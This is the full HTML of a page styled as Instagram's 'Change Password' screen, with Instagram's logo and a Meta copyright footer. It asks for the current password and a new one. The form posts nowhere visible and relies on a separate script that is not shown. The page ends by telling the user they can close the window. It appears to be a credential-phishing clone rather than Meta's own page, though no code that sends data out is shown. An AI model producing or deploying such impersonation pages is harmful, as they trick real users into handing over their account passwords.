<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="Change Password">
    <title>Change Password • Instagram</title>
    <link rel="stylesheet" href="change-password.css">
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 44 44'%3E%3Cpath fill='%230095f6' d='M22 0C9.8 0 0 9.8 0 22s9.8 22 22 22 22-9.8 22-22S34.2 0 22 0zm0 38.6c-9.1 0-16.6-7.5-16.6-16.6S12.9 5.4 22 5.4 38.6 12.9 38.6 22 31.1 38.6 22 38.6zm0-33.2c-9.1 0-16.6 7.5-16.6 16.6S12.9 38.6 22 38.6 38.6 31.1 38.6 22 31.1 5.4 22 5.4z'/%3E%3Cpath fill='%23fff' d='M22 10.4c-6.4 0-11.6 5.2-11.6 11.6s5.2 11.6 11.6 11.6 11.6-5.2 11.6-11.6S28.4 10.4 22 10.4zm0 20.8c-5.1 0-9.2-4.1-9.2-9.2s4.1-9.2 9.2-9.2 9.2 4.1 9.2 9.2-4.1 9.2-9.2 9.2z'/%3E%3Ccircle cx='34.6' cy='9.4' r='2.4' fill='%23fff'/%3E%3C/svg%3E">
</head>
<body>
    <div class="ig-wrapper">
        <div class="ig-card">
            <div class="ig-header">
                <img src="insta.png" alt="Instagram" class="ig-logo" width="175" height="51">
                <h1>Change Password</h1>
            </div>
            
            <p class="ig-description">Update your password to keep your account secure.</p>

            <form id="changePasswordForm" class="ig-form" novalidate>
                <div class="ig-form-group">
                    <label for="currentPassword" class="ig-label">Current Password</label>
                    <div class="ig-input-wrapper">
                        <input 
                            type="password" 
                            id="currentPassword" 
                            name="currentPassword" 
                            autocomplete="current-password"
                            placeholder="Current password"
                            required
                            aria-describedby="currentPasswordError"
                            inputmode="text"
                            enterkeyhint="next"
                        >
                        <button type="button" class="ig-toggle-password" aria-label="Show password" data-target="currentPassword">
                            <svg class="eye-open" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                            <svg class="eye-closed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                                <line x1="1" y1="1" x2="23" y2="23"/>
                            </svg>
                        </button>
                    </div>
                    <span id="currentPasswordError" class="ig-error" aria-live="polite"></span>
                </div>

                <div class="ig-form-group">
                    <label for="newPassword" class="ig-label">New Password</label>
                    <div class="ig-input-wrapper">
                        <input 
                            type="password" 
                            id="newPassword" 
                            name="newPassword" 
                            autocomplete="new-password"
                            placeholder="New password"
                            required
                            aria-describedby="newPasswordError"
                            inputmode="text"
                            enterkeyhint="next"
                        >
                        <button type="button" class="ig-toggle-password" aria-label="Show password" data-target="newPassword">
                            <svg class="eye-open" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                            <svg class="eye-closed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                                <line x1="1" y1="1" x2="23" y2="23"/>
                            </svg>
                        </button>
                    </div>
                    <span id="newPasswordError" class="ig-error" aria-live="polite"></span>
                    <!-- Password Strength Indicator -->
                    <div id="passwordStrength" class="ig-password-strength" aria-live="polite" hidden>
                        <div class="ig-strength-bar">
                            <div class="ig-strength-fill" id="strengthFill"></div>
                        </div>
                        <span class="ig-strength-text" id="strengthText"></span>
                    </div>
                </div>

                <div class="ig-form-group">
                    <label for="confirmPassword" class="ig-label">Confirm New Password</label>
                    <div class="ig-input-wrapper">
                        <input 
                            type="password" 
                            id="confirmPassword" 
                            name="confirmPassword" 
                            autocomplete="new-password"
                            placeholder="Confirm new password"
                            required
                            aria-describedby="confirmPasswordError"
                            inputmode="text"
                            enterkeyhint="done"
                        >
                        <button type="button" class="ig-toggle-password" aria-label="Show password" data-target="confirmPassword">
                            <svg class="eye-open" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                            <svg class="eye-closed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                                <line x1="1" y1="1" x2="23" y2="23"/>
                            </svg>
                        </button>
                    </div>
                    <span id="confirmPasswordError" class="ig-error" aria-live="polite"></span>
                </div>

                <button type="submit" class="ig-btn ig-btn-primary" id="submitBtn">
                    Save
                </button>
            </form>

            <div id="successMessage" class="ig-success" style="display: none;" role="alert">
                Password changed successfully! You can close this window now.
            </div>
        </div>
        
        <p class="ig-copyright">© 2024 Instagram from Meta</p>
    </div>

    <script src="change-password.js"></script>
</body>
</html>
